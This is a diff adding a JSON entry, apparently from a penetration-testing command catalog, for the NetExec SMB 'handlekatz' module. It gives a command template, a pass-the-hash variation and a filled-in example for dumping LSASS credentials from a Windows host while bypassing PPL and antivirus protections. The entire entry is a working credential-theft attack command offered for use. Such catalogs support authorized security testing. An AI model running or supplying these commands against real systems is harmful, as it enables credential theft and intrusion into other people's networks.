@@ -1,0 +1,31 @@
+{
+  "id": "nxc-smb-handlekatz",
+  "name": "NetExec SMB HandleKatz",
+  "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M handlekatz",
+  "description": "Dump LSASS credentials by duplicating process handles to bypass PPL/AV restrictions",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "smb"
+  ],
+  "tags": [
+    "nxc",
+    "smb",
+    "handlekatz",
+    "lsass",
+    "credential-dumping",
+    "ppl-bypass"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M handlekatz"
+    }
+  ],
+  "examples": [
+    "nxc smb '192.168.1.100' -u 'administrator' -p 'password' -M handlekatz"
+  ]
+}
